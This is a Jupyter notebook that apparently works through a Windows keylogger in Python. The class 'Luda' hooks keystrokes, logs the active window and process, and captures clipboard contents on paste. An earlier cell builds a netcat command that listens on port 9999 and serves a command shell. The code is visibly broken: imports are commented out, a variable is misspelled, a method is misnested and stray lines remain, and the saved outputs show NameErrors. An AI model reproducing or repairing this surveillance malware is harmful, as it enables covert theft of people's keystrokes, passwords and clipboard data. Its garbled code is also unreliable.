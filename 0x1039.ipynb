{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "c68e30f7-afc0-44e2-a8b0-6def2d7ab52e",
   "metadata": {},
   "outputs": [],
   "source": [
    "from ctypes import byref, create_string_buffer, c_ulong  #windll\n",
    "from io import StringIO\n",
    "\n",
    "import os\n",
    "#import pythoncom\n",
    "#import pyWinhook as pyHook\n",
    "import sys\n",
    "import time\n",
    "#import win32clipboard"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "182a2892-fbdd-4ba9-b315-4a0664f6ed01",
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'TGT_IP' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[0;32mIn [13], line 5\u001b[0m\n\u001b[1;32m      3\u001b[0m NETCAT \u001b[38;5;241m=\u001b[39m \u001b[38;5;124m'\u001b[39m\u001b[38;5;124m...\u001b[39m\u001b[38;5;124m'\u001b[39m\n\u001b[1;32m      4\u001b[0m TGP_IP \u001b[38;5;241m=\u001b[39m \u001b[38;5;124m'\u001b[39m\u001b[38;5;124m...\u001b[39m\u001b[38;5;124m'\u001b[39m\n\u001b[0;32m----> 5\u001b[0m CMD \u001b[38;5;241m=\u001b[39m \u001b[38;5;124mf\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mNETCAT\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m -t \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mTGT_IP\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m -p 9999 -l -c \u001b[39m\u001b[38;5;124m'\u001b[39m\n",
      "\u001b[0;31mNameError\u001b[0m: name 'TGT_IP' is not defined"
     ]
    }
   ],
   "source": [
    "TIMEOUT = 60*10\n",
    "\n",
    "NETCAT = '...'\n",
    "TGP_IP = '...'\n",
    "CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c '"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "74f9f552-d0bf-41dc-a33a-80458e39817f",
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'Luda' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[0;32mIn [14], line 1\u001b[0m\n\u001b[0;32m----> 1\u001b[0m \u001b[38;5;28;01mclass\u001b[39;00m \u001b[38;5;21;01mLuda\u001b[39;00m:\n\u001b[1;32m      2\u001b[0m     \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21m__init__\u001b[39m(\u001b[38;5;28mself\u001b[39m):\n\u001b[1;32m      3\u001b[0m         \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mcurrent_window \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;01mNone\u001b[39;00m\n",
      "Cell \u001b[0;32mIn [14], line 58\u001b[0m, in \u001b[0;36mLuda\u001b[0;34m()\u001b[0m\n\u001b[1;32m     55\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m log\n\u001b[1;32m     57\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;18m__name__\u001b[39m \u001b[38;5;241m==\u001b[39m \u001b[38;5;124m'\u001b[39m\u001b[38;5;124m__main__\u001b[39m\u001b[38;5;124m'\u001b[39m:\n\u001b[0;32m---> 58\u001b[0m     \u001b[38;5;28mprint\u001b[39m(\u001b[43mrun\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m)\n\u001b[1;32m     59\u001b[0m     \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m'\u001b[39m\u001b[38;5;124mEnjoy.\u001b[39m\u001b[38;5;124m'\u001b[39m)\n",
      "Cell \u001b[0;32mIn [14], line 46\u001b[0m, in \u001b[0;36mLuda.run\u001b[0;34m()\u001b[0m\n\u001b[1;32m     43\u001b[0m save_stdout \u001b[38;5;241m=\u001b[39m sys\u001b[38;5;241m.\u001b[39mstdout\n\u001b[1;32m     44\u001b[0m sys\u001b[38;5;241m.\u001b[39mstdout \u001b[38;5;241m=\u001b[39m StringIO()\n\u001b[0;32m---> 46\u001b[0m kl \u001b[38;5;241m=\u001b[39m \u001b[43mLuda\u001b[49m()\n\u001b[1;32m     47\u001b[0m hm \u001b[38;5;241m=\u001b[39m pyHook\u001b[38;5;241m.\u001b[39mHookManager()\n\u001b[1;32m     48\u001b[0m hm\u001b[38;5;241m.\u001b[39mKeyDown \u001b[38;5;241m=\u001b[39m kl\u001b[38;5;241m.\u001b[39mmykeystroke\n",
      "\u001b[0;31mNameError\u001b[0m: name 'Luda' is not defined"
     ]
    }
   ],
   "source": [
    "class Luda:\n",
    "    def __init__(self):\n",
    "        self.current_window = None\n",
    "        \n",
    "    def get_current_process(self):\n",
    "        hwdn = windll.user32.GetForegroundWindow()\n",
    "        pid = c_long(0)\n",
    "        windll.user32.GetWindowThreadProcessId(hwdn, byref(pid))\n",
    "        process_id = f'{pid.value}'\n",
    "        \n",
    "        executable = create_string_buffer(512)\n",
    "        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)\n",
    "        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)\n",
    "        \n",
    "        window_title = create_string_buffer(512)\n",
    "        windll.user32.GetWindowTextA(hwdn, byref(window_title), 512)\n",
    "        try:\n",
    "            self.current_window = window_title.value.decode()\n",
    "        except UnicodeDecodeError as e:\n",
    "            print(f'{e}: 0x10390138')\n",
    "            string.encode(encoding='UTF-8',errors='strict')\n",
    "        \n",
    "        print('\\n', process_id, executable.value.decode(), self.current_window)\n",
    "        \n",
    "        windll.kernel32.CloseHandle(hwdn)\n",
    "        windll.kernel32.CloseHandle(h_process)\n",
    "        \n",
    "        def mykeystroke(self, event):\n",
    "            if event.WindowName != self.current_window:\n",
    "                self.get_current_process()\n",
    "            if 32 < event.Ascii < 127:\n",
    "                print(chr(event.Ascii), end='')\n",
    "                string.encode(encoding='UTF-8',errors='strict')\n",
    "            else:\n",
    "                if event.Key == 'V':\n",
    "                    win32clipboard.OpenClipboard()\n",
    "                    value = win32clipboard.GetClipboardData()\n",
    "                    win32clipboard.CloseClipboard()\n",
    "                    print(f'[WKLEJENIE] - {value}')\n",
    "                    string.encode(encoding='UTF-8',errors='strict')\n",
    "                else:\n",
    "                    print(f'{event.Key}')\n",
    "                    string.encode(encoding='UTF-8',errors='strict')\n",
    "            return True\n",
    "    \n",
    "    def run():\n",
    "        save_stdout = sys.stdout\n",
    "        sys.stdout = StringIO()\n",
    "        \n",
    "        kl = Luda()\n",
    "        hm = pyHook.HookManager()\n",
    "        hm.KeyDown = kl.mykeystroke\n",
    "        hm.HookKeyboard()\n",
    "        while time.thread_time() < TIMEOUT:\n",
    "            pythoncom.PumpWaitingMessages()\n",
    "        \n",
    "        log = sys.stdout.getvalue()\n",
    "        sys.stdout = save_stdout\n",
    "        return log\n",
    "    \n",
    "    if __name__ == '__main__':\n",
    "        print(run())\n",
    "        print('Enjoy.')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e581eea-49c3-41ce-8adf-d49f848e0036",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
